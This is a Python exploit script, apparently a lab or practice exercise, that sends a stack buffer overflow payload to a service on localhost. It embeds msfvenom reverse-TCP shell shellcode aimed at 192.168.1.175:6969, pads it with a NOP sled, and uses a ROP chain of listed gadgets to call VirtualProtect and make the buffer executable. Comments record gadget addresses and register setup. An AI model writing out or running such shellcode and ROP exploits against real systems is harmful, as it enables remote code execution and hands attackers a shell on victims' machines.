import socket
import struct

# msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.1.175 LPORT=6969 -f c -e generic/none

shellcode = b""

# shellcode += b"\x48\x83\xEC\x08"
shellcode += b"\x48\xBA\x00P\xdd\x1b\xf6\x7f\x00\x00"
shellcode += b"\x48\xB9\x02\x02\x00\x00\x00\x00\x00\x00"
shellcode += b"\x48\xB8\x10\xeb\xf8\xb9\xfe\x7f\x00\x00"

# add rsp, b8
shellcode += b"\x48\x81\xC4\xE8\x03\x00\x00"

shellcode += b"\xFF\xD0"

# sub rsp, b8
shellcode += b"\x48\x81\xEC\xE8\x03\x00\x00"


shellcode += b"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d"
shellcode += b"\x05\xef\xff\xff\xff\x48\xbb\xe8\x87\x06\x21\x93"
shellcode += b"\x6a\xb6\xd9\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
shellcode += b"\xff\xe2\xf4\x14\xcf\x85\xc5\x63\x82\x76\xd9\xe8"
shellcode += b"\x87\x47\x70\xd2\x3a\xe4\x88\xbe\xcf\x37\xf3\xf6"
shellcode += b"\x22\x3d\x8b\x88\xcf\x8d\x73\x8b\x22\x3d\x8b\xc8"
shellcode += b"\xcf\x8d\x53\xc3\x22\xb9\x6e\xa2\xcd\x4b\x10\x5a"
shellcode += b"\x22\x87\x19\x44\xbb\x67\x5d\x91\x46\x96\x98\x29"
shellcode += b"\x4e\x0b\x60\x92\xab\x54\x34\xba\xc6\x57\x69\x18"
shellcode += b"\x38\x96\x52\xaa\xbb\x4e\x20\x43\xe1\x36\x51\xe8"
shellcode += b"\x87\x06\x69\x16\xaa\xc2\xbe\xa0\x86\xd6\x71\x18"
shellcode += b"\x22\xae\x9d\x63\xc7\x26\x68\x92\xba\x55\x8f\xa0"
shellcode += b"\x78\xcf\x60\x18\x5e\x3e\x91\xe9\x51\x4b\x10\x5a"
shellcode += b"\x22\x87\x19\x44\xc6\xc7\xe8\x9e\x2b\xb7\x18\xd0"
shellcode += b"\x67\x73\xd0\xdf\x69\xfa\xfd\xe0\xc2\x3f\xf0\xe6"
shellcode += b"\xb2\xee\x9d\x63\xc7\x22\x68\x92\xba\xd0\x98\x63"
shellcode += b"\x8b\x4e\x65\x18\x2a\xaa\x90\xe9\x57\x47\xaa\x97"
shellcode += b"\xe2\xfe\xd8\x38\xc6\x5e\x60\xcb\x34\xef\x83\xa9"
shellcode += b"\xdf\x47\x78\xd2\x30\xfe\x5a\x04\xa7\x47\x73\x6c"
shellcode += b"\x8a\xee\x98\xb1\xdd\x4e\xaa\x81\x83\xe1\x26\x17"
shellcode += b"\x78\x5b\x68\x2d\x1d\xc5\xeb\xb7\xb4\x34\x21\x93"
shellcode += b"\x2b\xe0\x90\x61\x61\x4e\xa0\x7f\xca\xb7\xd9\xe8"
shellcode += b"\xce\x8f\xc4\xda\xd6\xb4\xd9\xf3\xbe\xc6\x89\x92"
shellcode += b"\xc5\xf7\x8d\xa1\x0e\xe2\x6d\x1a\x9b\xf7\x63\xa4"
shellcode += b"\xf0\x20\x26\x6c\xbf\xfa\x50\x02\xef\x07\x20\x93"
shellcode += b"\x6a\xef\x98\x52\xae\x86\x4a\x93\x95\x63\x89\xb8"
shellcode += b"\xca\x37\xe8\xde\x5b\x76\x91\x17\x47\x4e\xa8\x51"
shellcode += b"\x22\x49\x19\xa0\x0e\xc7\x60\x29\x80\xb9\x06\x08"
shellcode += b"\x78\xd3\x69\x1a\xad\xdc\xc9\xa9\xdf\x4a\xa8\x71"
shellcode += b"\x22\x3f\x20\xa9\x3d\x9f\x84\xe7\x0b\x49\x0c\xa0"
shellcode += b"\x06\xc2\x61\x91\x6a\xb6\x90\x50\xe4\x6b\x45\x93"
shellcode += b"\x6a\xb6\xd9\xe8\xc6\x56\x60\xc3\x22\x3f\x3b\xbf"
shellcode += b"\xd0\x51\x6c\xa2\xaa\xdc\xd4\xb1\xc6\x56\xc3\x6f"
shellcode += b"\x0c\x71\x9d\xcc\xd3\x07\x20\xdb\xe7\xf2\xfd\xf0"
shellcode += b"\x41\x06\x49\xdb\xe3\x50\x8f\xb8\xc6\x56\x60\xc3"
shellcode += b"\x2b\xe6\x90\x17\x47\x47\x71\xda\x95\x7e\x94\x61"
shellcode += b"\x46\x4a\xa8\x52\x2b\x0c\xa0\x24\xb8\x80\xde\x46"
shellcode += b"\x22\x87\x0b\xa0\x78\xcc\xaa\x9d\x2b\x0c\xd1\x6f"
shellcode += b"\x9a\x66\xde\x46\xd1\x46\x6c\x4a\xd1\x47\x9b\x35"
shellcode += b"\xff\x0b\x44\x17\x52\x4e\xa2\x57\x42\x8a\xdf\x94"
shellcode += b"\x8d\x86\xda\x73\x1f\xb3\x62\xaf\x94\x74\x4e\xf9"
shellcode += b"\x6a\xef\x98\x61\x5d\xf9\xf4\x93\x6a\xb6\xd9"

# buff[1536]
# copies 2048

# 00007ffe`b89dc470 - virtualprotect

# 0x0000000140001002 : pop rsi ; ret
# 0x00007ffeb89dc470 : kernelbase!virtualprotect
# 0x00007ffeb89c4220 KERNELBASE!VirtualAlloc (void)

'''
EAX = NOP sled  
ECX = Old protection (writable address)  
EDX = PAGE_EXECUTE_READWRITE  
EBX = Size  
EBP = VirtualProtect return address (JMP ESP)  
ESI = KERNEL32.DLL!VirtualProtect  
EDI = ROPNOP  
----
0x000000018000520f : pop rax ; ret
0x0000000180040e0e : call rax
0x0000000140001006 : pop rcx ; ret
0x0000000140001004 : pop rdx ; ret
0x0000000140001083 : pop rbx ; ret
0x0000000140001822 : pop rbp ; ret
0x0000000140001008 : pop r8 ; ret
0x000000014000100b : pop r9 ; ret
0x0000000140001001 : ret
0x0000000180086b68 : push rsp ; ret
86b68
----
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,       RCX
  [in]  SIZE_T dwSize,          RDX
  [in]  DWORD  flNewProtect,    R8
  [out] PDWORD lpflOldProtect   R9
);

0x00007ff61bdd1265 call wsastartup
0x00007ffeb9f8eb10 wsastartup
'''

'''
00007ff6`1bdd125c b902020000     mov     ecx, 202h
00007ff6`1bdd1261 488d5590       lea     rdx, [rbp-70h]
00007ff6`1bdd1265 ff158d1e0000   call    qword ptr [7FF61BDD30F8h]


'''
b"\xb9\x02\x02\x00\x00\x48\x8d\x55\x90\xff\x15\x8d\x1e\x00\x00"

# A's are overwriting current functions return address with the address of virtual protect,
# which is why it's jumping to virtual protect.
def gimme_buf(buff_addr, base_addr):
    payload = (
        b'q' +
        b"\x90\x90" +
        shellcode + 
        b'\x90' * (1591 - len(shellcode) - 2) + 

     

        # calling virtualprotect
        struct.pack('<Q', 0x7ff61bdd100b) +  # pop r9 ; ret
        struct.pack('<Q', 0x7ff61bdd5000) +  # some READWRITE

        struct.pack('<Q', 0x7ff61bdd1008) +  # pop r8 ; ret
        struct.pack('<Q', 0x40) +           # PAGE_EXECUTE_READWRITE

        struct.pack('<Q', 0x7ff61bdd1004) +  # pop rdx ; ret
        struct.pack('<Q', 0x7e6) +          # dwSize
             
        struct.pack('<Q', 0x7ff61bdd1006) +  # pop rcx ; ret
        struct.pack('<Q', buff_addr) +  # buffer address

        struct.pack('<Q', 0x7ffeb89dc470) +  # kernelbase!virtualprotect


        # # calling WSAStartup
        # struct.pack('<Q', 0x7ff61bdd1004) +  # pop rdx ; ret
        # struct.pack('<Q', 0x7ff61bdd5000) +  # some READWRITE

        # struct.pack('<Q', 0x7ff61bdd1006) +  # pop rcx ; ret
        # struct.pack('<Q', 0x202) +

        # struct.pack('<Q', 0x7ff61bdd1001) +  # Extra ret for alignment?
        # struct.pack('<Q', 0x00007ffeb9f8eb10) +  # WSAStartup


     

        struct.pack('<Q', buff_addr + 1)   # buffer address
        
       
        # shellcode
    )


    '''
    RBP gets 0x202
    '''


    return payload

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect(("localhost", 51234))
        base_addr = sock.recv(8)
        base_addr = struct.unpack('<Q', base_addr)[0]
        print(hex(base_addr))
        
        buff_addr = sock.recv(8)
        buff_addr = struct.unpack('<Q', buff_addr)[0]
        print(hex(buff_addr))

        payload = gimme_buf(buff_addr, base_addr)
        sock.send(payload)
    return


if __name__ == "__main__":
    main()
